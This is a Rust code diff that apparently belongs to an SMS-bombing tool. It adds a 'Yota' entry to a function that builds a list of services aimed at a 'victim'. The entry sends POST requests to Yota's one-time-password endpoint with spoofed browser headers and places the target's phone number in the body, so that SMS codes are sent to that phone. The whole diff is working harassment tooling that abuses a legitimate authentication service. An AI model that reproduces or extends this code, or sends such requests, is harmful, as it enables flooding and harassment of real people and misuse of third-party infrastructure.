@@ -364,6 +364,84 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
 
                 services.push(service);
             }
+            // Yota
+            {
+                let mut service = Service {
+                    name: "Yota".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://mapi.yota.ru/general/otp/auth/generate".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"mapi.yota.ru"#.parse().unwrap());
+                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/plain, */*"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
+                service.headers.insert("platform", r#"4"#.parse().unwrap());
+                service.headers.insert("build", r#"1.0"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("mobile-brand", r#"YOTA-001"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("osVersion", r#"firefox-132"#.parse().unwrap());
+                service.headers.insert(
+                    "X-TransactionId",
+                    r#"b9cf45af-fa99-444e-9fc5-f5c33a072b07"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://web.yota.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Referer", r#"https://web.yota.ru/"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"mapi.yota.ru"#.parse().unwrap());
+
+                let phone = victim.phone.clone();
+                service.body = json!({
+                    "credentials": {
+                        "operationId": "iOS_mAPP_Auth_eSim",
+                        "msisdn": phone.phone
+                    },
+                    "channel": "SMS"
+                });
+
+                services.push(service);
+            }
         }
     }
 
